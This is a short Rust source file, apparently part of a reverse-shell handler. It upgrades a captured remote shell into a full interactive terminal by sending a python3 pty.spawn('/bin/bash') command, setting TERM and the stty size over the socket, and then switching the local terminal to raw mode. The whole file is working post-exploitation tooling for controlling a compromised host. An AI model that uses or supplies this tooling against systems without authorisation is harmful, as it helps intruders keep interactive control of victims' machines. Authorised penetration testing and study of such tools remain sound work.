use tokio::net::tcp::{OwnedWriteHalf, OwnedReadHalf};
use tokio::io::AsyncWriteExt;
use terminal_size::{Width, Height, terminal_size};
use crossterm::terminal::enable_raw_mode;

pub async fn upgrade_shell(_reader: &mut OwnedReadHalf, writer: &mut OwnedWriteHalf) -> Result<(), String> {
    // launch /bin/bash with python
    match writer.write_all(b"python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n").await {
        Ok(_)  => {},
        Err(_) => return Err("Failed to initialize reverse shell.".to_string()), }

    // set TERM env variable
    match writer.write_all(b"export TERM=xterm-256color\n").await {
        Ok(_)  => {},
        Err(_) => return Err("Failed to set XTERM variable.".to_string()),
    }

    // Set Terminal size with `stty`
    let size = terminal_size();
    if let Some((Width(w), Height(h))) = size {
        println!("Terminal size: with={} , height={}", w, h);

        // set the remote terminal size with stty
        let stty_command = format!("stty rows {} cols {}\n", h, w);

        match writer.write_all(stty_command.as_bytes()).await {
            Ok(_)  => {},
            Err(_) => return Err("Failed to write stty command to socket.".to_string()),
        }
    } else {
        return Err("Failed to obtain terminal size".to_string());
    }

    // Set Terminal in raw mode
    match enable_raw_mode() {
        Ok(_) => {},
        Err(_) => return Err("Failed to enable raw mode".to_string()),
    }

    Ok(())
}